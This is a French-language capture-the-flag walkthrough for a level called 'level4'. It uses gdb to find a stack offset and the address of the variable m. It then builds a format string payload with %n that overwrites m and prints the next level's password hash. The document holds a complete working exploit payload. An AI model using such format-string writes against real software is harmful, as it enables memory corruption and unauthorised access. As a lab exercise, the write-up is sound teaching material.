# Format String Exploitation

En décompilant l'exécutable, on remarque que le programme compare une variable statique `m` à la valeur `0x1025544`.

Il contient également un `printf` qui ne prend qu'un argument. Nous allons exploiter la faille `format string`.

L'objectif est d'utiliser les `modifiers` de `printf` pour écrire à l'adresse de la variable `m` la valeur `0x1025544` et ainsi valider la condition qui exécutera un `cat` du fichier contenant le mot de passe du `level5`.


Premièrement, convertissons `0x1025544` en base10.
```
0x1025544 = 16930116
```

Pour comprendre la faille, voici quelques exemples. Exécutons `gdb` pour avoir une idée du fonctionnement de la `stack` :

```
> gdb level4
[...]
> (gdb) disas p
[...]
Dump of assembler code for function p:
   0x08048444 <+0>:	push   %ebp
   0x08048445 <+1>:	mov    %esp,%ebp
   0x08048447 <+3>:	sub    $0x18,%esp
   0x0804844a <+6>:	mov    0x8(%ebp),%eax
   0x0804844d <+9>:	mov    %eax,(%esp)
   0x08048450 <+12>:	call   0x8048340 <printf@plt>
   0x08048455 <+17>:	leave
   0x08048456 <+18>:	ret
End of assembler dump.
```

On `break` juste après l'exécution du `printf` pour observer la `stack`, puis on lance le programme.

```
> (gdb) b *0x08048455
[...]
> (gdb) r
```

Voyons avec un exemple simple : utilisons `%1$p` en argument. Pour information, cela signifie, qu'on va avoir afficher le premier argument, et que nous voulons afficher l'adresse d'un pointeur. Cela va nous permettre de connaitre l'addresse du premier argument.


```
%1$p
[...]
0xb7ff26b0

Breakpoint 1, 0x08048455 in p ()
> (gdb) x $esp+0x04
0xbffff4c4:	0xb7ff26b0
```

On retrouve donc bien notre premier argument. 
`0xb7ff26b0` est donc l'addresse de notre premier argument.

Essayons maintenant en donnant en argument la chaine de caractère `AAAA`. Nous allons associer `%p` avec les `modifiers` `$1` qui sert à indiquer à `printf` qu'il doit afficher l'adresse du premier argument.
```
> (gdb) run
AAAA%1$p
> (gdb) x $esp 
0xbffff4c0:	0xbffff4f0
> (gdb) x 0xbffff4f0
0xbffff4f0:	0x41414141
```

En faisant `x $esp` on obtient l'addresse de `esp`. Si on affiche cette addresse, on retrouve bien nos `AAAA`.

On peut donc faire notre soustraction pour connaitre l'`offset` entre notre premier argument et le début du buffer. Donc :
 ```
 0xbffff4f0 - 0xbffff4c0
 ```  
Ce qui nous donne en héxadécimal `0x30` soit `48` en base 10.

On fait `48 / 4` et on obtient `12`.  
L'offset est donc de `12`. On peut le vérifier en affichant la pile.
Notre premier argument étant à `esp + 0x04`, on à un décalage de 1. 

```
> (gdb) x/13wx $esp
[...]
0xbffff4c0:	0xbffff4f0	0xb7ff26b0	0xbffff734	0xb7fd0ff4
0xbffff4d0:	0x00000000	0x00000000	0xbffff6f8	0x0804848d
0xbffff4e0:	0xbffff4f0	0x00000200	0xb7fd1ac0	0xb7ff37d0
0xbffff4f0:	0x41414141
```

On retrouve bien notre premier argument qui est `0xb7ff26b0` et notre `AAAA` qui est `0x41414141`. 

Si on raisonne de la manière dont `printf` s'exécute, il écrit d'abord `AAAA` en mémoire, puis affiche l'adresse du 12ème argument, qui est maintenant `0x41414141`.


Pour obtenir l'addresse de `m`, nous pouvons faire :

```
> gdb ./level4
[...]
> (gdb) info variables
[...]
0x08049810  m
```

L'addresse de m est donc `0x08049810`
En `little-endian`, cela nous donne : `\x10\x98\x04\x08`.

Nous ne pouvons pas faire d'`overflow` puisque notre programme attend `16930116` caractères. Néanmoins, nous pouvons utiliser le décalage dans `printf`, car le `%d` n'est pas écris dans le `stack`. Nous n'avons donc pas besoin de faire `A * 16930116` ce qui ne serait pas possible. 

Nous allons donc écrire à l'addresse de `m` en ajoutant nos `16930116` caractères, avec un `offset` de `12`.
L'adresse de `m` fait 4 octets. Nous devons donc soustraire 4 à `16930116`.

```
> python -c 'print "\x10\x98\x04\x08" + "%16930112d" + "%12$n"' > /var/tmp/hack4
> cat /var/tmp/hack4 | ./level4
[...]
0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
```
